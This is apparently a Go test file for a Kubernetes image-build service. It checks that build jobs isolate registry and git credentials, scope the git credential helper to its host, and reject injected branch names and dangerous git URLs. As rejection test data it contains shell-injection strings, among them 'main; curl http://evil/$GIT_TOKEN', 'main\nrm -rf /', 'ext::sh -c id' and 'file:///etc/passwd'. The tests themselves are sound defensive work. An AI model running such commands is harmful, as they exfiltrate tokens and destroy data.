package builder

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/client-go/kubernetes/fake"

	kipperv1 "github.com/getkipper/kipper/console-api/api/v1alpha1"
	"github.com/getkipper/kipper/console-api/internal/gitreach"
	"github.com/getkipper/kipper/console-api/internal/sharedcred"
)

func testApp() *kipperv1.App {
	return &kipperv1.App{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "my-app",
			Namespace: "project-test",
			UID:       types.UID("test-uid-123"),
		},
		Spec: kipperv1.AppSpec{
			Image: "old-image:latest",
			Port:  8080,
			Git: &kipperv1.AppGitSource{
				URL:    "https://github.com/example/my-app.git",
				Branch: "main",
			},
		},
	}
}

func TestImageRef(t *testing.T) {
	ref := ImageRef("project-test", "my-app", "abc123def456")
	assert.Equal(t, "zot.kipper-system.svc.cluster.local:5000/project-test/my-app:abc123def456", ref)
}

func TestCreateBuildJob(t *testing.T) {
	client := buildFakeClient()
	app := testApp()

	job, err := CreateBuildJob(context.Background(), client, app, "abc123def456")
	require.NoError(t, err)

	assert.Contains(t, job.Name, "my-app-build-", "the job name carries a readable app prefix")
	assert.LessOrEqual(t, len(job.Name), 56)
	assert.Equal(t, buildsNamespace, job.Namespace, "builds run in the isolated build namespace, not the tenant namespace")
	assert.Equal(t, "kipper", job.Labels[managedByLabel])
	assert.Equal(t, "my-app", job.Labels[appLabel])
	assert.Equal(t, "true", job.Labels[buildLabel])
	assert.Equal(t, "project-test", job.Labels[sourceNamespaceLabel], "the source-namespace label carries the tenant namespace the App lives in")
	assert.Equal(t, "test-uid-123", job.Labels[appUIDLabel])

	// No cross-namespace App owner reference (the App is in the tenant namespace).
	assert.Empty(t, job.OwnerReferences)

	// The build runs as the zero-permission builder identity with no token.
	assert.Equal(t, buildsServiceAccount, job.Spec.Template.Spec.ServiceAccountName)
	require.NotNil(t, job.Spec.Template.Spec.AutomountServiceAccountToken)
	assert.False(t, *job.Spec.Template.Spec.AutomountServiceAccountToken)

	// Init containers: the clone, then the Kaniko build. The build is an
	// init container so it finishes before the push container starts — and
	// so the push credential never coexists with user RUN instructions.
	require.Len(t, job.Spec.Template.Spec.InitContainers, 3)
	clone := job.Spec.Template.Spec.InitContainers[0]
	assert.Equal(t, "clone", clone.Name)
	// No-auth clone runs as argv (no shell): branch and URL are literal args.
	assert.Equal(t, "git", clone.Command[0])
	assert.Contains(t, clone.Command, "main")
	assert.Contains(t, clone.Command, "https://github.com/example/my-app.git")

	kaniko := job.Spec.Template.Spec.InitContainers[2]
	assert.Equal(t, "build", kaniko.Name)
	assert.Contains(t, kaniko.Args[0], "--dockerfile=Dockerfile")
	assert.Contains(t, kaniko.Args[1], "--context=dir:///workspace/.")
	assert.Contains(t, kaniko.Args[2], "zot.kipper-system.svc.cluster.local:5000/project-test/my-app:abc123def456")
	assert.Contains(t, kaniko.Args, "--no-push", "Kaniko must never push: it runs user code")
	assert.Contains(t, kaniko.Args, "--tar-path="+imageTarDir+"/image.tar")

	// The main container pushes the tarball; both tags come in as env data
	// expanded inside double quotes, so neither is parsed as shell syntax.
	require.Len(t, job.Spec.Template.Spec.Containers, 1)
	push := job.Spec.Template.Spec.Containers[0]
	assert.Equal(t, "push", push.Name)
	assert.Equal(t, skopeoImage, push.Image)
	pushEnv := map[string]string{}
	for _, e := range push.Env {
		pushEnv[e.Name] = e.Value
	}
	assert.Equal(t, "zot.kipper-system.svc.cluster.local:5000/project-test/my-app:abc123def456", pushEnv["IMAGE_REF"])
	assert.Equal(t, "zot.kipper-system.svc.cluster.local:5000/project-test/my-app:latest", pushEnv["LATEST_REF"])
	assert.Contains(t, push.Command[2], "docker-archive:"+imageTarDir+"/image.tar")
	assert.Contains(t, push.Command[2], `"docker://$IMAGE_REF"`)
	assert.Contains(t, push.Command[2], `"docker://$LATEST_REF"`)
	assert.Contains(t, push.Command[2], "--dest-cert-dir", "the push must verify the registry's TLS")

	// Job was created in the build namespace
	fetched, err := client.BatchV1().Jobs(buildsNamespace).Get(context.Background(), job.Name, metav1.GetOptions{})
	require.NoError(t, err)
	assert.Equal(t, job.Name, fetched.Name)
}

func TestCreateBuildJob_CustomDockerfile(t *testing.T) {
	client := buildFakeClient()
	app := testApp()
	app.Spec.Git.DockerfilePath = "docker/Dockerfile.prod"
	app.Spec.Git.Context = "backend"
	app.Spec.Git.BuildArgs = map[string]string{"NODE_ENV": "production"}

	job, err := CreateBuildJob(context.Background(), client, app, "def789")
	require.NoError(t, err)

	kaniko := job.Spec.Template.Spec.InitContainers[2]
	assert.Contains(t, kaniko.Args[0], "--dockerfile=docker/Dockerfile.prod")
	assert.Contains(t, kaniko.Args[1], "--context=dir:///workspace/backend")

	hasBuildArg := false
	for _, arg := range kaniko.Args {
		if arg == "--build-arg=NODE_ENV=production" {
			hasBuildArg = true
		}
	}
	assert.True(t, hasBuildArg)
}

func TestCreateBuildJob_ChecksForInternalRegistryBase(t *testing.T) {
	client := buildFakeClient()
	app := testApp()

	job, err := CreateBuildJob(context.Background(), client, app, "abc123")
	require.NoError(t, err)

	// A check-base init container runs between the clone and Kaniko, failing
	// the build early with a legible message if the Dockerfile bases on the
	// (now unreachable) cluster registry, instead of an opaque Kaniko TLS error.
	require.Len(t, job.Spec.Template.Spec.InitContainers, 3)
	check := job.Spec.Template.Spec.InitContainers[1]
	assert.Equal(t, "check-base", check.Name)
	assert.Equal(t, "build", job.Spec.Template.Spec.InitContainers[2].Name, "the check must run before Kaniko")

	assert.Equal(t, []string{"sh", "-c"}, check.Command[:2])
	script := check.Command[2]
	assert.Contains(t, script, `zot\.kipper-system\.svc\.cluster\.local:5000/`, "the check greps for a cluster-registry FROM with the dots escaped")
	assert.Contains(t, script, `"$1"`, "the dockerfile path is referenced as $1, never interpolated into the script")
	// The dockerfile path is passed as the positional arg, so a crafted path
	// cannot inject into the shell.
	assert.Equal(t, "/workspace/Dockerfile", check.Command[len(check.Command)-1])
}

// TestCheckBaseScript_Behaviour runs the actual check-base script the init
// container runs, against real Dockerfiles, so its behaviour is pinned rather
// than only its text. A cluster-registry FROM must fail (exit 1), including
// when split across a backslash line-continuation; a public base must pass.
func TestCheckBaseScript_Behaviour(t *testing.T) {
	client := buildFakeClient()
	job, err := CreateBuildJob(context.Background(), client, testApp(), "abc123")
	require.NoError(t, err)
	script := job.Spec.Template.Spec.InitContainers[1].Command[2]

	const registry = "zot.kipper-system.svc.cluster.local:5000"
	tests := []struct {
		name       string
		dockerfile string
		wantCaught bool
	}{
		{"cluster-registry base on one line", "FROM " + registry + "/project-test/base:latest\nRUN true\n", true},
		{
			"cluster-registry base split by a line continuation",
			"FROM \\\n  " + registry + "/project-test/base:latest\nRUN true\n",
			true,
		},
		{"cluster-registry base with a FROM flag", "FROM --platform=linux/amd64 " + registry + "/project-test/base:latest\n", true},
		{"public base image", "FROM alpine:3.20\nRUN true\n", false},
		{"public base split by a line continuation", "FROM \\\n  alpine:3.20\n", false},
		// A different registry that merely shares a prefix (a longer port) must
		// not match: the check requires the exact endpoint followed by "/".
		{"registry host that is only a prefix", "FROM " + registry + "0/example/base:latest\n", false},
		// Indirect bases are not diagnosed here (they fall back to Kaniko's
		// fail-closed error), so an ARG default is not flagged — which also means
		// an unused registry ARG never fails an all-public build.
		{"cluster-registry base via ARG default is not diagnosed early", "ARG BASE=" + registry + "/project-test/base:latest\nFROM ${BASE}\n", false},
		{"unused registry ARG with a public base", "ARG UNUSED=\"" + registry + "/project-test/cache:latest\"\nFROM alpine:3.20\nRUN true\n", false},
	}

	dir := t.TempDir()
	for i, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			path := filepath.Join(dir, fmt.Sprintf("Dockerfile.%d", i))
			require.NoError(t, os.WriteFile(path, []byte(tt.dockerfile), 0o600))

			// Run exactly as the init container does: sh -c <script> sh <path>.
			//nolint:gosec // script is built by CreateBuildJob from fixed inputs, not user data; the dockerfile path is a positional arg, never interpolated
			cmd := exec.Command("sh", "-c", script, "sh", path)
			err := cmd.Run()

			if tt.wantCaught {
				require.Error(t, err, "a cluster-registry base must be rejected")
				var exit *exec.ExitError
				require.ErrorAs(t, err, &exit)
				assert.Equal(t, 1, exit.ExitCode(), "the check exits 1 when it rejects the base")
			} else {
				assert.NoError(t, err, "a public base image must pass the check")
			}
		})
	}
}

func gitCredSecret(name, token string) *corev1.Secret {
	return &corev1.Secret{
		ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: "project-test"},
		Data:       map[string][]byte{"token": []byte(token)},
	}
}

// managedNamespace is a tenant namespace carrying the controller-owned labels
// namespaceProject reads to resolve a shared credential's allow-list.
// managedNamespace is the tenant namespace the shared-credential tests build in:
// name project-test, belonging to project "acme", carrying the controller-owned
// labels namespaceProject reads.
func managedNamespace() *corev1.Namespace {
	return &corev1.Namespace{
		ObjectMeta: metav1.ObjectMeta{
			Name: "project-test",
			Labels: map[string]string{
				managedByLabel: managedByValue,
				projectLabel:   "acme",
			},
		},
	}
}

// sharedCredsSecret is the kipper-system list Secret the builder resolves a
// shared credential from.
func sharedCredsSecret(t *testing.T, entries ...sharedcred.Entry) *corev1.Secret {
	t.Helper()
	data, err := json.Marshal(entries)
	require.NoError(t, err)
	return &corev1.Secret{
		ObjectMeta: metav1.ObjectMeta{Name: sharedcred.ConfigSecretName, Namespace: sharedcred.Namespace},
		Data:       map[string][]byte{"credentials": data},
	}
}

func TestCreateBuildJob_SharedCredential_AllowedProject(t *testing.T) {
	client := buildFakeClient(
		managedNamespace(),
		sharedCredsSecret(t, sharedcred.Entry{
			Name: "shared-gh", Server: "github.com", Token: "shared-token",
			AllowedProjects: []string{"acme"},
		}),
	)
	app := testApp() // clones from github.com
	app.Spec.Git.CredentialsSecret = "shared-gh"

	job, err := CreateBuildJob(context.Background(), client, app, "abc123")
	require.NoError(t, err)

	// The shared token is staged from the kipper-system list, never copied into
	// the tenant namespace.
	staged := buildSecretByKey(t, client, app, "token")
	require.NotNil(t, staged)
	assert.Equal(t, "shared-token", string(staged.Data["token"]))

	clone := job.Spec.Template.Spec.InitContainers[0]
	assert.Equal(t, "GIT_EXPECTED_HOST", clone.Env[1].Name)
	assert.Equal(t, "github.com", clone.Env[1].Value)
	assert.Contains(t, clone.Command, "credential.https://github.com.helper=")
}

func TestCreateBuildJob_SharedCredential_DeniedProject(t *testing.T) {
	client := buildFakeClient(
		managedNamespace(),
		sharedCredsSecret(t, sharedcred.Entry{
			Name: "shared-gh", Server: "github.com", Token: "shared-token",
			AllowedProjects: []string{"other-project"}, // not acme
		}),
	)
	app := testApp()
	app.Spec.Git.CredentialsSecret = "shared-gh"

	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
	require.Error(t, err)
	assert.Contains(t, err.Error(), "not allowed for project")
	// The build must not stage the token when denied.
	assert.Nil(t, buildSecretByKey(t, client, app, "token"))
}

func TestCreateBuildJob_SharedCredential_EmptyAllowListDenies(t *testing.T) {
	client := buildFakeClient(
		managedNamespace(),
		sharedCredsSecret(t, sharedcred.Entry{
			Name: "shared-gh", Server: "github.com", Token: "shared-token",
			// No AllowedProjects: fail closed, usable by no project.
		}),
	)
	app := testApp()
	app.Spec.Git.CredentialsSecret = "shared-gh"

	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
	require.Error(t, err)
	assert.Contains(t, err.Error(), "not allowed for project")
}

func TestCreateBuildJob_SharedCredential_HostMismatch(t *testing.T) {
	client := buildFakeClient(
		managedNamespace(),
		sharedCredsSecret(t, sharedcred.Entry{
			Name: "shared-gl", Server: "gitlab.example.com", Token: "shared-token",
			AllowedProjects: []string{"acme"},
		}),
	)
	app := testApp() // clones from github.com, not gitlab.example.com
	app.Spec.Git.CredentialsSecret = "shared-gl"

	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
	require.Error(t, err)
	assert.Contains(t, err.Error(), "bound to")
	assert.Nil(t, buildSecretByKey(t, client, app, "token"))
}

func TestCreateBuildJob_PerAppCredential_RejectsForeignSecret(t *testing.T) {
	// A Secret in the tenant namespace that is NOT the app's own credential
	// (e.g. a shared-credential copy a baseline cluster fanned out, or any other
	// tenant Secret) must not be usable as a per-app credential: only
	// <app>-git-credentials is accepted, so it cannot bypass the shared-cred
	// allow-list and host binding.
	client := buildFakeClient(gitCredSecret("git-acme-tools", "leaked-global-token"))
	app := testApp()
	app.Spec.Git.CredentialsSecret = "git-acme-tools" // not my-app-git-credentials, not in the shared list

	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
	require.Error(t, err)
	assert.Contains(t, err.Error(), "neither an allowed shared credential nor this app's own credential")
	assert.Nil(t, buildSecretByKey(t, client, app, "token"), "a foreign tenant Secret must not be staged")
}

func TestCreateBuildJob_UnreadableSharedListFailsClosed(t *testing.T) {
	// A malformed shared-credential list must fail the build rather than silently
	// downgrade to the unrestricted per-app path.
	badList := &corev1.Secret{
		ObjectMeta: metav1.ObjectMeta{Name: "kipper-git-credentials", Namespace: "kipper-system"},
		Data:       map[string][]byte{"credentials": []byte("{not json")},
	}
	client := buildFakeClient(badList, gitCredSecret("my-app-git-credentials", "ghp_test"))
	app := testApp()
	app.Spec.Git.CredentialsSecret = "my-app-git-credentials"

	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
	require.Error(t, err)
	assert.Contains(t, err.Error(), "verifying shared git credentials")
}

func TestCreateBuildJob_SharedCredential_UnmanagedNamespaceFailsClosed(t *testing.T) {
	client := buildFakeClient(
		// The namespace exists but carries no project label.
		&corev1.Namespace{ObjectMeta: metav1.ObjectMeta{Name: "project-test"}},
		sharedCredsSecret(t, sharedcred.Entry{
			Name: "shared-gh", Server: "github.com", Token: "shared-token",
			AllowedProjects: []string{"acme"},
		}),
	)
	app := testApp()
	app.Spec.Git.CredentialsSecret = "shared-gh"

	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
	require.Error(t, err, "an unmanaged/unlabelled namespace must fail closed")
}

// TestCloneCredentialHelper_Behaviour runs the actual credential-helper shell
// the clone init container runs, and pins the security property: the token is
// emitted only for a `get` over https to the bound host, and nothing otherwise.
func TestCloneCredentialHelper_Behaviour(t *testing.T) {
	cmd := cloneCommand("github.com", "main", "https://github.com/example/my-app.git")
	// cloneCommand emits: git -c credential.helper= -c <scoped>= -c <scoped>=<helper> clone ...
	// The helper body is the value after the last "credential.https://...helper=".
	var helper string
	for _, a := range cmd {
		if strings.HasPrefix(a, "credential.https://github.com.helper=!") {
			helper = strings.TrimPrefix(a, "credential.https://github.com.helper=")
		}
	}
	require.NotEmpty(t, helper, "expected a scoped credential helper body")
	script := strings.TrimPrefix(helper, "!") // git runs the string after '!'

	run := func(op, stdin string, env ...string) string {
		// git invokes the helper as `<script> <op>` via the shell with the pod env.
		c := exec.Command("sh", "-c", script+" "+op) //nolint:gosec // fixed script from cloneCommand, op is a literal test constant
		c.Env = append([]string{"GIT_TOKEN=secret-token", "GIT_EXPECTED_HOST=github.com"}, env...)
		c.Stdin = strings.NewReader(stdin)
		out, _ := c.Output()
		return string(out)
	}

	matching := "protocol=https\nhost=github.com\n\n"
	if got := run("get", matching); !strings.Contains(got, "password=secret-token") || !strings.Contains(got, "username=x-access-token") {
		t.Errorf("get for the bound host must emit the token, got %q", got)
	}
	if got := run("get", "protocol=https\nhost=evil.example\n\n"); strings.Contains(got, "secret-token") {
		t.Errorf("get for a different host must not emit the token, got %q", got)
	}
	if got := run("get", "protocol=http\nhost=github.com\n\n"); strings.Contains(got, "secret-token") {
		t.Errorf("a non-https request must not emit the token, got %q", got)
	}
	if got := run("store", matching); strings.Contains(got, "secret-token") {
		t.Errorf("store must emit nothing, got %q", got)
	}
	if got := run("erase", matching); strings.Contains(got, "secret-token") {
		t.Errorf("erase must emit nothing, got %q", got)
	}
}

func TestCreateBuildJob_WithCredentials(t *testing.T) {
	// A per-app credential is the app's own <app>-git-credentials Secret.
	client := buildFakeClient(gitCredSecret("my-app-git-credentials", "ghp_test"))
	app := testApp()
	app.Spec.Git.CredentialsSecret = "my-app-git-credentials"

	job, err := CreateBuildJob(context.Background(), client, app, "abc123")
	require.NoError(t, err)

	// The token is read from the tenant namespace and staged as an ephemeral
	// build-scoped Secret in the build namespace; the clone references that.
	staged := buildSecretByKey(t, client, app, "token")
	require.NotNil(t, staged, "the git token must be staged in the build namespace")
	assert.Equal(t, "ghp_test", string(staged.Data["token"]))
	assert.Equal(t, "project-test", staged.Labels[sourceNamespaceLabel])

	clone := job.Spec.Template.Spec.InitContainers[0]
	// The token comes from the staged secret; the bound host is a plain value the
	// helper body checks git's request against.
	require.Len(t, clone.Env, 2)
	assert.Equal(t, "GIT_TOKEN", clone.Env[0].Name)
	require.NotNil(t, clone.Env[0].ValueFrom)
	require.NotNil(t, clone.Env[0].ValueFrom.SecretKeyRef)
	assert.Equal(t, staged.Name, clone.Env[0].ValueFrom.SecretKeyRef.Name)
	assert.Equal(t, "GIT_EXPECTED_HOST", clone.Env[1].Name)
	assert.Equal(t, "github.com", clone.Env[1].Value)

	// This command is a security boundary, so the full argv is pinned exactly:
	// any drift (a shell entry point, a second URL, a reordered flag, an
	// unscoped helper) must fail the test, not slip past a substring check.
	//
	// The clone runs as argv (no shell) against the clean repository URL — an
	// authenticated URL would be recorded in /workspace/.git/config, inside the
	// Kaniko build context, where any Dockerfile can read it and a plain
	// `COPY . .` bakes it into published image layers. The empty
	// `credential.helper=` (and the empty scoped reset) clear helpers inherited
	// from the image's git config, which would otherwise also receive the token
	// via `store` after a successful auth. The helper is scoped to the clone host
	// (`credential.https://github.com.helper`) so git offers the token only to
	// that host, and its body re-checks the request host against
	// $GIT_EXPECTED_HOST before presenting the token as the PASSWORD with
	// `x-access-token` as the username (which works for GitHub fine-grained PATs,
	// classic PATs, and GitLab).
	assert.Equal(t, []string{
		"git",
		"-c", "credential.helper=",
		"-c", "credential.https://github.com.helper=",
		"-c", `credential.https://github.com.helper=!f() { [ "$1" = get ] || exit 0; h=; p=; while IFS='=' read -r k v; do case "$k" in host) h=$v;; protocol) p=$v;; esac; done; [ "$p" = https ] && [ "$h" = "$GIT_EXPECTED_HOST" ] && printf 'username=x-access-token\npassword=%s\n' "$GIT_TOKEN"; }; f`,
		"clone", "--branch", "main", "--single-branch", "--depth", "1",
		"https://github.com/example/my-app.git", "/workspace",
	}, clone.Command)

	// Neither the Kaniko container (which runs the user's Dockerfile) nor
	// the push container may ever see the git token.
	for _, c := range []corev1.Container{job.Spec.Template.Spec.InitContainers[2], job.Spec.Template.Spec.Containers[0]} {
		for _, e := range c.Env {
			assert.NotEqual(t, "GIT_TOKEN", e.Name)
		}
	}
}

// buildSecretByKey returns the ephemeral build Secret carrying dataKey, found
// by the build labels — object names fold in a per-build random id, so tests
// match on labels rather than an exact name.
func buildSecretByKey(t *testing.T, client *fake.Clientset, app *kipperv1.App, dataKey string) *corev1.Secret {
	t.Helper()
	list, err := client.CoreV1().Secrets(buildsNamespace).List(context.Background(), metav1.ListOptions{
		LabelSelector: fmt.Sprintf("%s=%s,%s=%s", sourceNamespaceLabel, app.Namespace, appLabel, app.Name),
	})
	require.NoError(t, err)
	for i := range list.Items {
		if _, ok := list.Items[i].Data[dataKey]; ok {
			return &list.Items[i]
		}
	}
	return nil
}

func buildRegistrySecret(t *testing.T, client *fake.Clientset, app *kipperv1.App) *corev1.Secret {
	return buildSecretByKey(t, client, app, "push-config.json")
}

// zotPlatformSecrets builds the kipper-system objects kip installs on every
// cluster: the registry push credential and the TLS secret carrying the CA.
// Every build reads them, so every CreateBuildJob test needs them.
func zotPlatformSecrets() []runtime.Object {
	return []runtime.Object{
		&corev1.Secret{
			ObjectMeta: metav1.ObjectMeta{Name: "zot-pull-credentials", Namespace: "kipper-system"},
			Data:       map[string][]byte{"password": []byte("pullpw")},
		},
		&corev1.Secret{
			ObjectMeta: metav1.ObjectMeta{Name: "zot-push-credentials", Namespace: "kipper-system"},
			Type:       corev1.SecretTypeOpaque,
			Data:       map[string][]byte{"password": []byte("pushpw")},
		},
		&corev1.Secret{
			ObjectMeta: metav1.ObjectMeta{Name: "zot-tls", Namespace: "kipper-system"},
			Type:       corev1.SecretTypeTLS,
			Data: map[string][]byte{
				"ca.crt":  []byte("-----BEGIN CERTIFICATE-----\nfake\n-----END CERTIFICATE-----\n"),
				"tls.crt": []byte("leaf"),
				"tls.key": []byte("key"),
			},
		},
	}
}

// buildFakeClient is fake.NewClientset with the platform registry secrets
// plus any test-specific objects.
func buildFakeClient(objects ...runtime.Object) *fake.Clientset {
	return fake.NewClientset(append(zotPlatformSecrets(), objects...)...)
}

func TestCreateBuildJob_ClusterRegistryCredIsolation(t *testing.T) {
	client := buildFakeClient()
	app := testApp()

	job, err := CreateBuildJob(context.Background(), client, app, "abc123")
	require.NoError(t, err)

	// Kaniko runs the Dockerfile's RUN steps, so it must carry NO
	// cluster-registry credential and NO cluster-registry CA: a Dockerfile can
	// neither read another tenant's images nor reach the cluster registry.
	kaniko := job.Spec.Template.Spec.InitContainers[2]
	kanikoMounts := map[string]string{}
	for _, m := range kaniko.VolumeMounts {
		kanikoMounts[m.Name] = m.MountPath
	}
	_, hasCA := kanikoMounts["zot-ca"]
	assert.False(t, hasCA, "Kaniko must not carry the cluster-registry CA")
	_, hasPushAuth := kanikoMounts["push-auth"]
	assert.False(t, hasPushAuth, "the write credential must never be mounted where the Dockerfile's RUN instructions execute")
	_, hasDockerConfig := kanikoMounts["docker-config"]
	assert.False(t, hasDockerConfig, "Kaniko must carry no registry credential: a Dockerfile RUN could read it or bake it into a layer")
	args := strings.Join(kaniko.Args, " ")
	assert.NotContains(t, args, "--registry-certificate", "Kaniko no longer talks to the cluster registry")
	assert.NotContains(t, args, "--insecure")

	// The push container runs no user code and is the only place the write
	// credential and the CA exist.
	pushC := job.Spec.Template.Spec.Containers[0]
	pushMounts := map[string]string{}
	for _, m := range pushC.VolumeMounts {
		pushMounts[m.Name] = m.MountPath
	}
	assert.Equal(t, skopeoAuthDir, pushMounts["push-auth"])
	assert.NotEmpty(t, pushMounts["zot-ca"])
	_, pushSeesWorkspace := pushMounts["workspace"]
	assert.False(t, pushSeesWorkspace, "the push container only needs the image tarball")

	// The staged registry secret lives in the build namespace, never the tenant's.
	secret := buildRegistrySecret(t, client, app)
	require.NotNil(t, secret, "the registry secret must be staged in the build namespace")
	assert.Equal(t, buildsNamespace, secret.Namespace)
	_, tenantErr := client.CoreV1().Secrets(app.Namespace).Get(context.Background(), "my-app-build-registry", metav1.GetOptions{})
	assert.Error(t, tenantErr, "no registry secret may be left in the tenant namespace")
	assert.Contains(t, string(secret.Data["ca.crt"]), "BEGIN CERTIFICATE")

	// The staged secret carries only the push config + CA; there is no pull
	// config, because Kaniko no longer pulls with any credential.
	_, hasPull := secret.Data["pull-config.json"]
	assert.False(t, hasPull, "no third-party pull config is staged for Kaniko")

	var pushCfg dockerConfig
	require.NoError(t, json.Unmarshal(secret.Data["push-config.json"], &pushCfg))
	pushEntry, ok := pushCfg.Auths[registryEndpoint]
	require.True(t, ok, "the push config must carry the write account")
	assert.Contains(t, string(pushEntry), base64.StdEncoding.EncodeToString([]byte("kipper-push:pushpw")))
}

func TestCreateBuildJob_FailsWithoutClusterRegistryCredential(t *testing.T) {
	// Without the platform push credential the push would fail at the end of
	// the build anyway; failing before creating the Job gives a diagnosable
	// error instead of a Kaniko 401 in the build log.
	client := fake.NewClientset()
	app := testApp()

	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
	require.Error(t, err)
	assert.Contains(t, err.Error(), "zot-push-credentials")
}

func TestValidateGitSource(t *testing.T) {
	valid := []struct{ url, branch string }{
		{"https://github.com/example/my-app.git", "main"},
		{"https://gitlab.com/team/app", "feature/new-thing"},
		{"https://git.example.com/r", "release-1.2.3"},
	}
	for _, c := range valid {
		assert.NoError(t, validateGitSource(c.url, c.branch), "%s @ %s", c.url, c.branch)
	}

	// Injection branches must be rejected.
	badBranches := []string{
		"main;curl evil", "main`id`", "$(whoami)", "a b", "main|nc",
		"../../etc", "-x", "main\nrm -rf /", "",
	}
	for _, b := range badBranches {
		assert.Error(t, validateGitSource("https://github.com/example/my-app.git", b), "branch %q", b)
	}

	// Dangerous or non-https URLs must be rejected, including git's local
	// transports that would run commands even without a shell.
	badURLs := []string{
		"ext::sh -c id", "file:///etc/passwd", "http://insecure/r",
		"ssh://git@host/r", "git://host/r", "not a url", "",
	}
	for _, u := range badURLs {
		assert.Error(t, validateGitSource(u, "main"), "url %q", u)
	}
}

func TestCreateBuildJob_RejectsInjection(t *testing.T) {
	client := fake.NewClientset()
	app := testApp()
	app.Spec.Git.Branch = "main; curl http://evil/$GIT_TOKEN"

	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
	require.Error(t, err)
}

func TestBuildJobName(t *testing.T) {
	// Deterministic for a given (namespace, app, buildID), carries a readable
	// app prefix, and fits the 63-char DNS-1123 limit with room for the pod
	// suffix Kubernetes appends.
	a := buildJobName("blog", "my-app", "id-1")
	assert.Equal(t, a, buildJobName("blog", "my-app", "id-1"), "deterministic for the same inputs")
	assert.Contains(t, a, "my-app-build-")
	assert.LessOrEqual(t, len(a), 56)

	// A different build id, app, or namespace yields a different name — so a
	// rebuild never reuses a name and two apps never collide.
	assert.NotEqual(t, a, buildJobName("blog", "my-app", "id-2"), "a new build id gives a fresh name")
	assert.NotEqual(t, a, buildJobName("blog", "other", "id-1"))
	assert.NotEqual(t, a, buildJobName("other", "my-app", "id-1"))

	// The hyphen-alignment cross-tenant collision a digest-only-on-overflow
	// scheme allowed is closed: these differ even with the same build id.
	assert.NotEqual(t, buildJobName("t1-app", "a1", "id"), buildJobName("t1", "app-a1", "id"))

	// The longest accepted app name is truncated but stays in bounds and
	// distinct across build ids.
	long := buildJobName("blog", strings.Repeat("a", 80), "id-1")
	assert.LessOrEqual(t, len(long), 56)
	assert.NotEqual(t, long, buildJobName("blog", strings.Repeat("a", 80), "id-2"))

	// The name keeps 128 bits (32 hex chars) of digest after the readable
	// prefix, so accidental collisions in the shared namespace stay negligible.
	_, digest, ok := strings.Cut(a, "-build-")
	require.True(t, ok, "name carries a -build-<digest> suffix")
	assert.Regexp(t, "^[0-9a-f]{32}$", digest, "the digest is 32 hex characters (128 bits)")
}

func TestNewBuildID_Unique(t *testing.T) {
	a, err := newBuildID()
	require.NoError(t, err)
	b, err := newBuildID()
	require.NoError(t, err)
	assert.NotEqual(t, a, b, "each build attempt gets a distinct id")
	// 16 random bytes hex-encoded: 128 bits of entropy, so a build id never
	// collides in the shared namespace.
	assert.Regexp(t, "^[0-9a-f]{32}$", a, "the build id is 128 bits of hex-encoded entropy")
}

func TestCreateBuildJob_NoGitSource(t *testing.T) {
	client := fake.NewClientset()
	app := testApp()
	app.Spec.Git = nil

	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "no git source configured")
}

func TestGetBuildPod_NotFound(t *testing.T) {
	client := fake.NewClientset()
	_, err := GetBuildPod(context.Background(), client, "project-test", "my-app")
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "no build pod found")
}

func TestCancelBuild_NoJobs(t *testing.T) {
	client := fake.NewClientset()
	err := CancelBuild(context.Background(), client, "project-test", "my-app")
	assert.NoError(t, err)
}

func TestGetBuildStatus_NoJobs(t *testing.T) {
	client := fake.NewClientset()
	status, err := GetBuildStatus(context.Background(), client, "project-test", "my-app")
	require.NoError(t, err)
	assert.Nil(t, status)
}

func TestCancelBuilds_DeletesAllRegardlessOfStatus(t *testing.T) {
	// All build Jobs live in the shared build namespace, scoped by the
	// source-namespace label; a build for a different source namespace must
	// survive.
	buildLabels := func(sourceNS string) map[string]string {
		return map[string]string{appLabel: "my-app", buildLabel: "true", sourceNamespaceLabel: sourceNS}
	}
	pending := &batchv1.Job{ObjectMeta: metav1.ObjectMeta{Name: "b1", Namespace: buildsNamespace, Labels: buildLabels("project-test")}}
	succeeded := &batchv1.Job{ObjectMeta: metav1.ObjectMeta{Name: "b2", Namespace: buildsNamespace, Labels: buildLabels("project-test")}, Status: batchv1.JobStatus{Succeeded: 1}}
	otherProject := &batchv1.Job{ObjectMeta: metav1.ObjectMeta{Name: "unrelated", Namespace: buildsNamespace, Labels: buildLabels("other-project")}}
	client := fake.NewClientset(pending, succeeded, otherProject)

	require.NoError(t, CancelBuilds(context.Background(), client, "project-test", "my-app"))

	remaining, err := client.BatchV1().Jobs(buildsNamespace).List(context.Background(), metav1.ListOptions{})
	require.NoError(t, err)
	assert.Len(t, remaining.Items, 1, "only another project's build survives")
	assert.Equal(t, "unrelated", remaining.Items[0].Name)
}

func TestCancelBuilds_SweepsOrphanedSecrets(t *testing.T) {
	// A build secret whose ownerRef patch never landed (console-api died
	// mid-build) has no owner, so CancelBuilds must delete it by label rather
	// than leave a live credential for the janitor's hours-long window.
	labels := map[string]string{appLabel: "my-app", buildLabel: "true", sourceNamespaceLabel: "project-test"}
	job := &batchv1.Job{ObjectMeta: metav1.ObjectMeta{Name: "b1", Namespace: buildsNamespace, Labels: labels}}
	orphan := &corev1.Secret{ObjectMeta: metav1.ObjectMeta{Name: "b1-git", Namespace: buildsNamespace, Labels: labels}}
	otherProject := &corev1.Secret{ObjectMeta: metav1.ObjectMeta{Name: "keep", Namespace: buildsNamespace, Labels: map[string]string{appLabel: "my-app", buildLabel: "true", sourceNamespaceLabel: "other"}}}
	client := fake.NewClientset(job, orphan, otherProject)

